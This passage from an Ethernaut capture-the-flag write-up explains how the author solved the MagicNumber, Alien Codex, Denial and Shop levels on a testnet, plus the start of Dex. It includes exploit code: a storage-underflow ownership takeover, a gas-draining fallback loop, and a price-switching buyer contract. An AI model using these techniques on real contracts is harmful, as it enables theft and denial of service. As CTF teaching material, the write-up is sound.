<p>This code basically stores the <code>caller()</code> in slot 0 and copies the contract code (“Runtime”) to it (<code>datacopy()</code>) and specifying the size of the contract code (<code>datasize()</code>) and the offset (<code>dataoffset()</code>). The name of the object containing the code (in my case “Runtime”) can be anything, it simply serves as a way to refer to it through functions like <code>datasize()</code>, which take a string of the name of a Yul object. The return opcode concludes the runtime of the constructor.</p>
<p>And this is the code of the contract itself after deployment (runtime opcodes), what is stored on the blockchain:</p>
<pre><code>object "Runtime" {
    code {
        mstore(0x0, 0x2a)
        return(0x0, 0x20)    
    }
}
</code></pre>
<p>This object also has code, and this code is also extremely short, but does what we are asked for in the exercise as requested, which is first allocate memory (<code>mstore</code>) on slot <code>0x0</code> with the value <code>0x2a</code> which is the number 42 in hexadecimal. Then it takes that value in slot <code>0x0</code> and <code>return</code>s it as <code>0x20</code> which is 32 bytes.</p>
<p>Subsequently, I compiled and deployed the contract using the Remix IDE, which has a Yul compiler marked as experimental at the time of solving this challenge.</p>
<ol start="2">
<li>Call the <code>setSolver()</code> function to set the solver to the address of the deployed contract</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">magicnumber<span class="token punctuation">.</span>setSolver<span class="token punctuation">(</span><span class="token string">'0x678a4e09ec08d8fd32abc0f4e3e28469fe8b6e80'</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x39dd993c53234338ad6928550cfc73040081da7007c11ae15c5a05fbbd3e116f">https://rinkeby.etherscan.io/tx/0x39dd993c53234338ad6928550cfc73040081da7007c11ae15c5a05fbbd3e116f</a></p>
<ol start="3">
<li>The only way to confirm this works is to either make a set up of the Ethernaut challenges locally, or just attempt to submit on the Ethernaut site, and I decided to just submit, since it can be attempted again anyway even if it’s wrong. In my case, I made a few attempts tweaking different values until I got it right, my biggest error was that in the “Runtime” object I was writing numbers in decimal instead of hexadecimal.</li>
</ol>
<h3 id="submission-transaction-17">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xc46148d557083fb12b8768884f70091d3099f535ae20281edc8a6f8018a7c5f5">https://rinkeby.etherscan.io/tx/0xc46148d557083fb12b8768884f70091d3099f535ae20281edc8a6f8018a7c5f5</a></p>
<hr>
<h2 id="alien-codex">Alien Codex</h2>
<h3 id="objectives-17">Objectives</h3>
<p>Claim ownership to complete the level.</p>
<h3 id="solution-17">Solution</h3>
<p>In the AlienCodex contract we can leverage the <code>retract()</code> function to cause an integer underflow in the length of the <code>codex</code> array. This underflow allows us to modify any state variable in the contract through the <code>revise()</code> function. The exploit can be performed as follows:</p>
<ol>
<li>
<p>Call the <code>make_contact()</code> function to pass the <code>contacted()</code> modifier check, requiring <code>contact</code> to be true.</p>
</li>
<li>
<p>Call the <code>retract()</code> function to cause an integer overflow in the <code>codex</code> array length</p>
</li>
<li>
<p>Find the hash of the <code>owner</code> state variable as if it were part of the <code>codex</code> array by:</p>
</li>
</ol>
<ul>
<li>
<p>Obtaining the hash of the first item in the <code>codex</code> array (as it is indexed in the contract storage), corresponding to its slot in the contract storage. This can be obtained by computing the Keccak256 hash of first <em>position</em>, so: <code>keccak256(0x0000000000000000000000000000000000000000000000000000000000000001)</code>.</p>
</li>
<li>
<p>Taking the hash resulting from this (<code>0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</code>) and subtracting its integer value from the maximum amount of slots in a contract plus one (<span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>256</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{256} - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.897438em; vertical-align: -0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.814108em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">256</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">1</span></span></span></span></span>), so roughly:</p>
</li>
</ul>
<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mn>2</mn><mn>256</mn></msup><mo>−</mo><mi>i</mi><mi>n</mi><mi>t</mi><mo stretchy="false">(</mo><mn>0</mn><mi>x</mi><mi>b</mi><mn>10</mn><mi>e</mi><mn>2</mn><mi>d</mi><mn>527612073</mn><mi>b</mi><mn>26</mn><mi>e</mi><mi>e</mi><mi>c</mi><mi>d</mi><mi>f</mi><mi>d</mi><mn>717</mn><mi>e</mi><mn>6</mn><mi>a</mi><mn>320</mn><mi>c</mi><mi>f</mi><mn>44</mn><mi>b</mi><mn>4</mn><mi>a</mi><mi>f</mi><mi>a</mi><mi>c</mi><mn>2</mn><mi>b</mi><mn>0732</mn><mi>d</mi><mn>9</mn><mi>f</mi><mi>c</mi><mi>b</mi><mi>e</mi><mn>2</mn><mi>b</mi><mn>7</mn><mi>f</mi><mi>a</mi><mn>0</mn><mi>c</mi><mi>f</mi><mn>6</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">2^{256} - int(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.947438em; vertical-align: -0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.864108em;"><span class="" style="top: -3.113em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">256</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">in</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord mathnormal">b</span><span class="mord">10</span><span class="mord mathnormal">e</span><span class="mord">2</span><span class="mord mathnormal">d</span><span class="mord">527612073</span><span class="mord mathnormal">b</span><span class="mord">26</span><span class="mord mathnormal">eec</span><span class="mord mathnormal">dfd</span><span class="mord">717</span><span class="mord mathnormal">e</span><span class="mord">6</span><span class="mord mathnormal">a</span><span class="mord">320</span><span class="mord mathnormal">c</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord">44</span><span class="mord mathnormal">b</span><span class="mord">4</span><span class="mord mathnormal">a</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord">0732</span><span class="mord mathnormal">d</span><span class="mord">9</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord mathnormal">c</span><span class="mord mathnormal">b</span><span class="mord mathnormal">e</span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord">7</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord mathnormal">a</span><span class="mord">0</span><span class="mord mathnormal">c</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord">6</span><span class="mclose">)</span></span></span></span></span></span></p>
<p>In Python (for example):</p>
<pre class=" language-python"><code class="prism  language-python"><span class="token number">2</span><span class="token operator">**</span><span class="token number">256</span> <span class="token operator">-</span>  <span class="token builtin">int</span><span class="token punctuation">(</span>web3<span class="token punctuation">.</span>sha3<span class="token punctuation">(</span>hexstr<span class="token operator">=</span>f<span class="token string">'0x{"0"*63}1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
</code></pre>
<p>Which returns the hash: <code>0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</code></p>
<ol start="4">
<li>Using this resulting value in <code>revise()</code> as the <code>i</code> (index) of the array <code>codex</code> to modify and <code>_content</code> as our address.</li>
</ol>
<h3 id="how-i-did-it-17">How I did it</h3>
<p><em>Exactly</em> as described in <a href="#solu">solution</a>, but using my local setup in brownie:</p>
<ol>
<li>Call <code>make_contact()</code></li>
</ol>
<pre class=" language-python"><code class="prism  language-python">aliencodex<span class="token punctuation">.</span>make_contact<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x74e8128a14d8864febad45c3af8eeb42f8da329fb5a991a6ce863343ed31a581">https://rinkeby.etherscan.io/tx/0x74e8128a14d8864febad45c3af8eeb42f8da329fb5a991a6ce863343ed31a581</a></p>
<ol start="2">
<li>Call <code>retract()</code></li>
</ol>
<pre class=" language-python"><code class="prism  language-python">aliencodex<span class="token punctuation">.</span>retract<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x2affc0a88a1ec555330db5735d68e7819159a18aa905d5fb93698aa9eaa05dd1">https://rinkeby.etherscan.io/tx/0x2affc0a88a1ec555330db5735d68e7819159a18aa905d5fb93698aa9eaa05dd1</a></p>
<ol start="3">
<li>Obtain the <code>codex</code> hash with the position of the <code>_owner</code> state variable in storage</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">position_one <span class="token operator">=</span> encode_abi<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'uint256'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
owner_hash <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">256</span> <span class="token operator">-</span> <span class="token builtin">int</span><span class="token punctuation">(</span>web3<span class="token punctuation">.</span>sha3<span class="token punctuation">(</span>hexstr<span class="token operator">=</span>f<span class="token string">"0x{position_one}"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<ol start="4">
<li>Call <code>revise()</code> passing in my address and the hash</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">aliencodex<span class="token punctuation">.</span>revise<span class="token punctuation">(</span>owner_hash<span class="token punctuation">,</span> acc<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x12237e71e4fe8c6dcb94a3b3dea913d30fc8c99cc96faa890bb5bb3e1bdcb7da">https://rinkeby.etherscan.io/tx/0x12237e71e4fe8c6dcb94a3b3dea913d30fc8c99cc96faa890bb5bb3e1bdcb7da</a></p>
<ol start="5">
<li>Confirm that my address is indeed the new owner</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">owner_assertion <span class="token operator">=</span> aliencodex<span class="token punctuation">.</span>owner<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> acc<span class="token punctuation">.</span>address
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Address {acc.address} is the owner of the contract: {owner_assertion}"</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-18">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x5aeb0a8299d1b6000a56b6952b15f88f9571781402a839b483cab48f37749998">https://rinkeby.etherscan.io/tx/0x5aeb0a8299d1b6000a56b6952b15f88f9571781402a839b483cab48f37749998</a></p>
<hr>
<h2 id="denial">Denial</h2>
<h3 id="objectives-18">Objectives</h3>
<p>If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.</p>
<h3 id="solution-18">Solution</h3>
<p>The message call in the Denial contract does not specify an amount of gas, so we can define a <code>receive()</code> fallback function in our attacker contract that will be so expensive that unless the <code>partner</code> address is changed, it will not be possible to call the <code>withdraw()</code> function.</p>
<ol>
<li>
<p>Code and deploy an attacker contract. The attacker should have a <code>receive()</code> fallback function that runs some set of instructions that are extremely expensive.</p>
</li>
<li>
<p>Make the attacker contract <code>partner</code> through the <code>setWithdrawPartner()</code> function.</p>
</li>
</ol>
<p>If a specific amount to spend had been set, execution would not halt and the <code>transfer()</code> function in line 24 would have executed without issues.</p>
<h3 id="how-i-did-it-18">How I did it</h3>
<ol>
<li>I coded and deployed (at: <code>0x5708A3c4d9472B9D6951200c6d6C2FB82ef96c50</code>) an attacker contract with a <code>receive()</code> fallback function defined as follows:</li>
</ol>
<pre class=" language-js"><code class="prism  language-js"><span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external payable <span class="token punctuation">{</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        foreverLooping <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>foreverLooping <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>foreverLooping <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Where <code>foreverLooping</code> is a state variable:</p>
<pre class=" language-js"><code class="prism  language-js">uint256 <span class="token keyword">private</span> foreverLooping<span class="token punctuation">;</span>
</code></pre>
<p>In python:</p>
<pre class=" language-python"><code class="prism  language-python">denialattack <span class="token operator">=</span> DenialAttack<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>denial<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<ol start="2">
<li>I made the contract <code>partner</code> through a function inside the contract I defined which calls <code>setWithdrawPartner()</code> in Denial through an interface:</li>
</ol>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">setThisAsWithdrawPartner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    denialContract<span class="token punctuation">.</span><span class="token function">setWithdrawPartner</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Where <code>denialContract</code> is the interface object.</p>
<p>In python:</p>
<pre class=" language-python"><code class="prism  language-python">denialattack<span class="token punctuation">.</span>setThisAsWithdrawPartner<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xdee6f9ca64398992a8f98aecdbaab5ffa3e411ae9b104b4e06b677fb4aa1731c">https://rinkeby.etherscan.io/tx/0xdee6f9ca64398992a8f98aecdbaab5ffa3e411ae9b104b4e06b677fb4aa1731c</a></p>
<ol start="3">
<li>I tested calling the <code>withdraw()</code> function myself within a try-except block, since I usually get an <code>RPCRequestError</code> when trying to access the <code>revert_msg</code> attribute of a reverted transaction. However, if I did get the <code>revert_msg</code> anyway, this would also still work:</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># test withdraw() to see if the tx fails</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    tx <span class="token operator">=</span> denial<span class="token punctuation">.</span>withdraw<span class="token punctuation">(</span>_from <span class="token operator">|</span> <span class="token punctuation">{</span><span class="token string">'allow_revert'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token comment"># fail tx assertion</span>
    fail_tx_assertion <span class="token operator">=</span> <span class="token boolean">False</span>

<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token comment"># fail tx assertion</span>
    fail_tx_assertion <span class="token operator">=</span> <span class="token boolean">True</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"The transaction failed/reverted: {fail_tx_assertion}"</span><span class="token punctuation">)</span>
</code></pre>
<p>With this call, I determine through the assertion if the action of the challenge instance will work or not.</p>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xdc37b616c23234b2f87eaeda94715482580a129c6ce2bad5f28a77aefd5b79c7">https://rinkeby.etherscan.io/tx/0xdc37b616c23234b2f87eaeda94715482580a129c6ce2bad5f28a77aefd5b79c7</a> (reverted tx)</p>
<h3 id="submission-transaction-19">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x778e0059d279b716c24808fd4ecc2ea79ca6b7396ee05da2e7ed35ea6ca3733b">https://rinkeby.etherscan.io/tx/0x778e0059d279b716c24808fd4ecc2ea79ca6b7396ee05da2e7ed35ea6ca3733b</a></p>
<hr>
<h2 id="shop">Shop</h2>
<h3 id="objectives-19">Objectives</h3>
<p>Сan you get the item from the shop for less than the price asked?</p>
<h3 id="solution-19">Solution</h3>
<p>It is possible to return different values based on the state variable <code>isSold</code>. After the check passes where <code>_buyer.price() &gt;= price &amp;&amp; !isSold</code> returns true, we can internally change our contract so that the value that <code>price()</code> returns changes based on <code>isSold</code>.</p>
<p>All we have to do is make sure the function <code>price()</code> returns 100 when <code>isSold</code> is false and a value under 100 when <code>isSold</code> is false.</p>
<h3 id="how-i-did-it-19">How I did it</h3>
<ol>
<li>Code and deploy a Buyer contract (at: <code>0xB9dcacbc393D15fEa292705d66c1549035CcB3ee</code>) where I define the <code>price()</code> function as follows:</li>
</ol>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> view <span class="token function">returns</span> <span class="token punctuation">(</span>uint256<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>shopContract<span class="token punctuation">.</span><span class="token function">isSold</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token number">100</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>If <code>isSold</code> is true, the price gets overwritten by a 1, however, in the if statement, we pass the check (requiring <code>price()</code> to return 100) since <code>isSold</code> is still false.</p>
<p>In python:</p>
<pre class=" language-python"><code class="prism  language-python">buyer <span class="token operator">=</span> Buyer<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>shop<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<ol start="2">
<li>Call the buy function in the Shop contract, which the Shop contract expects to see coming from another contract (in this case my Buyer contract).</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">buyer<span class="token punctuation">.</span>shop<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x2bcb495224d8fbf2ab49a0750336ff0ec2b9cb07e824022381655e51e589335b">https://rinkeby.etherscan.io/tx/0x2bcb495224d8fbf2ab49a0750336ff0ec2b9cb07e824022381655e51e589335b</a></p>
<ol start="3">
<li>Confirm that the price &lt; 100</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">price_assertion <span class="token operator">=</span> shop<span class="token punctuation">.</span>price<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">100</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"The selling price is below 100: {price_assertion}"</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-20">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xae682a54188a7c3de2a542e0a5699bc39a908dff1c14e8cfaa9039e593413331">https://rinkeby.etherscan.io/tx/0xae682a54188a7c3de2a542e0a5699bc39a908dff1c14e8cfaa9039e593413331</a></p>
<hr>
<h2 id="dex">Dex</h2>
<h3 id="objectives-20">Objectives</h3>
<p>The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.</p>
<h3 id="solution-20">Solution</h3>
<p>First we have to approve both tokens for transfer, which we can conveniently do with the <code>approve()</code> function in the Dex contract. Then we take advantage of the poor way to compute the price used by the contract.</p>
<p>The ratio used to compute the price of each asset is as follows:</p>
<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>g</mi><mi>e</mi><mi>t</mi><mi>S</mi><mi>w</mi><mi>a</mi><mi>p</mi><mi>P</mi><mi>r</mi><mi>i</mi><mi>c</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mi>n</mi></msub><mo separator="true">,</mo><msub><mi>T</mi><mi>k</mi></msub><mo separator="true">,</mo><mi>A</mi><mo stretchy="false">)</mo><mo>=</mo><mi>A</mi><mo>∗</mo><mfrac><mrow><mi>b</mi><mi>a</mi><mi>l</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi>O</mi><mi>f</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mi>n</mi></msub><mo separator="true">,</mo><mi>D</mi><mi>e</mi><mi>x</mi><mo stretchy="false">)</mo></mrow><mrow><mi>b</mi><mi>a</mi><mi>l</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi>O</mi><mi>f</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mi>k</mi></msub><mo separator="true">,</mo><mi>D</mi><mi>e</mi><mi>x</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">getSwapPrice(T_n, T_k, A) = A * \frac{balanceOf(T_n, Dex)}{balanceOf(T_k, Dex)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span style="margin-right: 0.03588em;" class="mord mathnormal">g</span><span class="mord mathnormal">e</span><span style="margin-right: 0.02691em;" class="mord mathnormal">tSw</span><span class="mord mathnormal">a</span><span style="margin-right: 0.13889em;" class="mord mathnormal">pP</span><span style="margin-right: 0.02778em;" class="mord mathnormal">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ce</span><span class="mopen">(</span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.336108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span style="margin-right: 0.03148em;" class="mord mathnormal mtight">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.68333em; vertical-align: 0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 2.363em; vertical-align: -0.936em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.427em;"><span class="" style="top: -2.314em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord mathnormal">ba</span><span style="margin-right: 0.01968em;" class="mord mathnormal">l</span><span class="mord mathnormal">an</span><span class="mord mathnormal">ce</span><span style="margin-right: 0.02778em;" class="mord mathnormal">O</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mopen">(</span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.336108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span style="margin-right: 0.03148em;" class="mord mathnormal mtight">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord mathnormal">De</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord mathnormal">ba</span><span style="margin-right: 0.01968em;" class="mord mathnormal">l</span><span class="mord mathnormal">an</span><span class="mord mathnormal">ce</span><span style="margin-right: 0.02778em;" class="mord mathnormal">O</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mopen">(</span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord mathnormal">De</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.936em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span></p>
<p>Where:</p>
<ul>
<li><span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi>e</mi><mi>t</mi><mi>S</mi><mi>w</mi><mi>a</mi><mi>p</mi><mi>P</mi><mi>r</mi><mi>i</mi><mi>c</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mi>n</mi></msub><mo separator="true">,</mo><msub><mi>T</mi><mi>k</mi></msub><mo separator="true">,</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">getSwapPrice(T_n, T_k, A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span style="margin-right: 0.03588em;" class="mord mathnormal">g</span><span class="mord mathnormal">e</span><span style="margin-right: 0.02691em;" class="mord mathnormal">tSw</span><span class="mord mathnormal">a</span><span style="margin-right: 0.13889em;" class="mord mathnormal">pP</span><span style="margin-right: 0.02778em;" class="mord mathnormal">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ce</span><span class="mopen">(</span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.336108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span style="margin-right: 0.03148em;" class="mord mathnormal mtight">k</span></span></span></span><span 